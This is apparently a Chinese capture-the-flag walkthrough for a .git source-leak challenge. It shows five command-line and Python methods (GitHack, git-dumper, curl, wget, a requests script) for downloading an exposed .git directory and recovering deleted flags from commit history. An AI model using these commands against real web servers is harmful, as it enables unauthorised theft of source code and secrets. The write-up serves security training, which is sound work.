Log

当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题

Background

.git 目录暴露在Web服务器上，攻击者可以还原源代码，通过 git log 查看历史提交记录找到敏感信息。

Way1：GitHack

# 安装
git clone https://github.com/BugScanTeam/GitHack
cd GitHack

# 使用（替换为题目靶机地址）
python2 GitHack.py http://challenge-xxxxxxxx.ctfhub.com:10800/.git/

# 进入还原的目录
cd dist/challenge-xxxxxxxx.ctfhub.com:10800/

# 查看提交历史 ← 核心步骤
git log --oneline

# 会看到类似：
# a1b2c3d add flag
# e4f5g6h remove flag   <-- flag曾在这个commit里！

# 切换到包含flag的历史版本
git checkout <commit_hash>
# 或
git diff <commit_hash> HEAD

# 查找flag
cat flag.txt
# 或 grep -r "ctfhub" .

Way2：GitDumper + git-extractor

# 使用 git-dumper
pip install git-dumper
git-dumper http://challenge-xxxxxxxx.ctfhub.com:10800/.git/ ./output

cd output
git log --all --oneline

# 查看所有历史中的文件变动
git log --all --full-history -- "*flag*"

# 恢复某次提交的内容
git show <commit_hash>:flag.txt

Way3：手动 curl 下载关键文件

# 先获取HEAD指针
curl http://target/.git/HEAD
# 输出: ref: refs/heads/master

# 获取日志文件（核心！）
curl http://target/.git/logs/HEAD
# 能看到所有commit hash

# 获取COMMIT_EDITMSG（最近提交信息）
curl http://target/.git/COMMIT_EDITMSG

# 根据commit hash获取tree object
curl http://target/.git/objects/<前2位>/<后38位>
# 用python解压zlib：
python3 -c "import zlib,sys; print(zlib.decompress(open(sys.argv[1],'rb').read()))" object_file

Way4：dirsearch + wget 镜像

# 先确认.git暴露
dirsearch -u http://target/ -e git

# wget递归下载整个.git目录
wget -r --no-parent http://target/.git/

# 进入下载目录，直接用git命令
cd target/.git/../
git log --oneline --all
git stash list  # 查看stash
git show HEAD~1  # 查看上一次提交

Way5：Python脚本自动化

import requests
import zlib
import hashlib

base_url = "http://challenge-xxxxxxxx.ctfhub.com:10800/.git/"

# 读取日志找所有commit
r = requests.get(base_url + "logs/HEAD")
print(r.text)

# 提取commit hash后查看objects
commits = [line.split()[1] for line in r.text.strip().split('\n') if line]
for commit in commits:
    obj_url = base_url + f"objects/{commit[:2]}/{commit[2:]}"
    resp = requests.get(obj_url)
    if resp.status_code == 200:
        data = zlib.decompress(resp.content)
        print(f"Commit {commit[:8]}: {data[:200]}")

核心思路总结

.git/logs/HEAD             → 查看所有历史commit
.git/COMMIT_EDITMSG        → 最新提交说明（可能含提示）
git log --all              → 找"add flag"/"remove flag"等可疑提交
git show <hash>            → 查看该次提交的具体内容
git diff <hash1> <hash2>   → 对比两次提交差异

Flag通常藏在哪？

位置 命令
被删除的文件 git show <旧commit>
提交说明里 git log --pretty=full
stash暂存 git stash pop
其他分支 git branch -a → git checkout other-branch

💡 Log题关键：flag通常在某次历史提交中被”删除”，用 git log 找到可疑commit后用 git show <hash> 或 git checkout <hash> 即可还原！
